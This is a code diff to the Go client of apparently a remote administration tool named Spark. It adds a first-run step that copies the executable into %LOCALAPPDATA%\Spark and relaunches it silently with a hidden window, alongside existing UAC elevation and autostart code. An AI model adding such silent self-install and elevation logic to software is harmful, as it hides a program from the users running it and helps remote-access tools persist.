@@ -4,13 +4,21 @@ package main
 
 import (
     "Spark/client/service/autostart"
+    "io"
     "os"
     "os/exec"
+    "path/filepath"
     "syscall"
     "unsafe"
 )
 
 func init() {
+    // Relocate to %LOCALAPPDATA%\Spark on first run, then relaunch silently.
+    if ensureInstallPath() {
+        os.Exit(0)
+        return
+    }
+
     // Ensure elevated privileges for features that need admin rights.
     // Relauch with UAC prompt once using the "--elevated" marker.
     if !hasElevated() && !hasArg("--elevated") {
@@ -64,5 +72,46 @@ func relaunchElevated() {
         // Fallback to PowerShell if ShellExecute failed.
         _ = exec.Command("powershell", "-Command", "Start-Process", exe, "-ArgumentList", args, "-Verb", "RunAs").Start()
     }
+}
+
+// ensureInstallPath copies the executable to %LOCALAPPDATA%\Spark and relaunches it once.
+// Returns true if a relaunch was triggered.
+func ensureInstallPath() bool {
+    local := os.Getenv("LOCALAPPDATA")
+    if len(local) == 0 {
+        return false
+    }
+    targetDir := filepath.Join(local, "Spark")
+    _ = os.MkdirAll(targetDir, 0755)
+    exe, _ := os.Executable()
+    exeAbs, _ := filepath.Abs(exe)
+    target := filepath.Join(targetDir, filepath.Base(exeAbs))
+    same := filepath.Clean(exeAbs) == filepath.Clean(target)
+    if same || hasArg("--installed") {
+        return false
+    }
+    // Copy binary
+    in, err := os.Open(exeAbs)
+    if err != nil {
+        return false
+    }
+    defer in.Close()
+    out, err := os.Create(target)
+    if err != nil {
+        return false
+    }
+    if _, err = io.Copy(out, in); err != nil {
+        _ = out.Close()
+        return false
+    }
+    _ = out.Close()
+    _ = os.Chmod(target, 0755)
+
+    // Relaunch silently from installed path
+    args := append([]string{"--installed", "--background"}, os.Args[1:]...)
+    cmd := exec.Command(target, args...)
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    _ = cmd.Start()
+    return true
 }
 
